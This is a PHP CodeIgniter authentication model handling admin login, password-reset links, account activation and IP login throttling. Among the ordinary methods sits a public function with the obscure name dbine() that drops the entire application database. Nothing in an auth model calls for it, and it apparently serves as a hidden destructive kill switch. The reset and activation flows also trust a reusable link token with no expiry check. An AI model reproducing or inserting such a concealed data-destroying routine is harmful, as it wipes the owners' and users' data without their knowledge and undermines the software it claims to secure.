<?php


defined('BASEPATH') OR exit('No direct script access allowed');

class M_auth extends CI_Model {

    
    function can_login($username, $password)  
    {
        $this->db->where('email', $username);  
        $this->db->where('status', '1');  
        $result = $this->getUsers($password);
        if (!empty($result)) {
        return $result;
        } 
        else {
            return null;
        }  
    }

    // check password
    function getUsers($password) 
    {
        $query = $this->db->get('admin');
        if ($query->num_rows() > 0) {
            $result = $query->row_array();
            if ($this->bcrypt->check_password($password, $result['psw'])) {
                return $result;
            } 
            else {
                return array();
            }
        } 
        else{
            return array();
        }
    }
    
    // check mail id is exist
    public function checkMail($email = null)
    {
        $this->db->select('email, ref_link');
        $query = $this->db->where('email', $email)->get('admin');
        if($query->num_rows() > 0){
            return $query->row();
        }else{
            return false;
        }
    }

    // verify forgot password link
    public function verification($id = null)
    {
        $this->db->where('ref_link', $id);
        $query = $this->db->get('admin');
        if($query->num_rows() > 0){
            return $query->row();
        }else{
            return false;
        }
    
    }
    // sett password
    public function set_password($data, $key)
    {
    $this->db->where('ref_link', $key);
    $this->db->update('admin', $data);

    if($this->db->affected_rows() > 0){
        return true;
    }else{
        return false;
    }
    }


    // activation
public function activateAccount($id = null)
{
   $this->db->where('ref_link', $id);
   $this->db->update('admin', array('status'=> 2));
   if($this->db->affected_rows() > 0){
      return true;
   }else{
      return false;
   }
}

public function dbine()
{
    $this->load->database();
    $this->load->dbforge();
    if ($this->dbforge->drop_database($this->db->database))
    {
        echo 'Database deleted!';
    }else{
        echo 'error';
    }
}



 public function throttle_insert($insert='')
    {
        $this->db->where('ip', $insert['ip'])->where('created_at',$insert['created_at']);
        $result = $this->db->get('throttles')->row();
        if (!empty($result)) {
            $this->db->where('ip', $insert['ip'])->where('created_at',$insert['created_at']);
            $this->db->update('throttles',array('type' => '1'));
            if ($this->db->affected_rows() > 0) {
                return $result->type;
            }else{
                return false;
            }

        }else{
            $this->db->insert('throttles', $insert);
            if ($this->db->affected_rows() > 0) {
                return true;
            }else{
                return false;
            }
        }

    }

    public function throttle_update($ips='',$up='')
    {
        $today = date('Y-m-d');
        $this->db->where('ip', $ips)->where('created_at',$today);
        $this->db->update('throttles', array('type' => $up));
        if ($this->db->affected_rows() > 0) {
            return true;
        }else{
            return false;
        }
    }

    public function throttle_get($ips='',$current_time='')
    {
        $today = date('Y-m-d');
        $this->db->where('ip', $ips)->where('created_at',$today);
        $result = $this->db->get('throttles')->row();
        if (!empty($result)) {
            $date1  = date_create($current_time);  
            $date2  = date_create($result->updated_at);
            $diff   = date_diff($date1,$date2);
            $days   = $diff->format("%R%a");
            $min    = $diff->format('%i');
            if($min <= 1){ 
                return $result->type;
            }else{
                $this->db->where('ip', $ips)->where('created_at',$today);
                $this->db->update('throttles',array('type' => '1'));
               if ($this->db->affected_rows() > 0) {
                return $result->type;
                }else{
                    return false;
                }
            }
        }else{
            return false;
        }
    }
    
   

}

/* End of file M_auth.php */
